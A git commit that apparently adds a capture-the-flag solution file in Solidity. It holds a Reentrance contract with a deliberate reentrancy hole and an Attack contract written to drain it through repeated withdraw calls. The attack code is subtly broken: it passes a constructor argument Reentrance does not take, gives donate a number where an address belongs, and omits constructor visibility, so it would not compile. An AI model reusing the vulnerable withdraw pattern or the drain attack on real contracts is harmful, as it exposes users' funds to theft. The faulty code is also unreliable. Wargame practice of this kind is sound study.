a5a76c5d60ee83c333a8eddc5f866f0e5613db01
lai.glorison <lai.glorison@gmail.com>
2024-03-01 01:05:40 +1100

    c10 contract

---
+++ c10/src/Reentrance.sol
@@ -0,0 +1,46 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import 'openzeppelin-contracts-06/math/SafeMath.sol';
+
+contract Reentrance {
+  
+  using SafeMath for uint256;
+  mapping(address => uint) public balances;
+
+  function donate(address _to) public payable {
+    balances[_to] = balances[_to].add(msg.value);
+  }
+
+  function balanceOf(address _who) public view returns (uint balance) {
+    return balances[_who];
+  }
+
+  function withdraw(uint _amount) public {
+    if(balances[msg.sender] >= _amount) {
+      (bool result,) = msg.sender.call{value:_amount}("");
+      if(result) {
+        _amount;
+      }
+      balances[msg.sender] -= _amount;
+    }
+  }
+
+  receive() external payable {}
+}
+
+contract Attack {
+  Reentrance reentrance;
+
+  constructor(address _reentranceAddr) {
+    reentrance = new Reentrance(_reentranceAddr);
+  }
+
+  function deposit() public payable {
+    reentrance.donate(msg.value);
+  }
+
+  receive() external payable {
+    reentrance.withdraw(msg.value);
+  }
+}
